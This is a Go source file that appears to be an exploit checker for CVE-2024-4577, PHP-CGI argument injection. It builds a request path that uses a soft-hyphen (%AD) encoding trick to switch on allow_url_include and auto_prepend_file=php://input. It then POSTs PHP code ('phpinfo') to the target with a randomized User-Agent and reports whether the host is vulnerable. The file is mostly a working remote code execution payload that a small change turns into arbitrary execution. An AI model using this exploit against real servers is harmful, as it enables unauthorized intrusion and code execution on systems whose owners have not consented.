package exploit

import (
    "fmt"

	"github.com/corpix/uarand"
    "github.com/zomasec/CVE-2024-4577/config"
    "github.com/zomasec/CVE-2024-4577/pkg/client"
    "github.com/zomasec/CVE-2024-4577/pkg/utils"
)

type ResultType int8

const (
	ScanResult ResultType = iota
	Error
)

type Result struct {
	Host string
	Vulnerable bool
	Type ResultType
}

var cfg = config.Init()

// CheckExploit checks if the POC is exploitable or not
func CheckExploit(ip string, timeout int) *Result {
	path := "/test.hello?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
	data := "<?php phpinfo(); ?>"
	headers := map[string]string{
		"User-Agent":     uarand.GetRandom(),
		"Accept":         "*/*",
		"Content-Length": "23",
		"Content-Type":   "application/x-www-form-urlencoded",
		"Connection":     "keep-alive",
	}
	

	response, err := client.MakeRequest(fmt.Sprintf("%s%s", ip, path) , "POST", data, headers, timeout)
	if err != nil {
		cfg.Logger.ERROR("Error checking IP %s: %v\n", ip, err)
		return &Result{Host: ip, Type: Error}
	}

	return &Result{Host: ip, Vulnerable: utils.ContainsPHPVersion(response), Type: ScanResult}
}
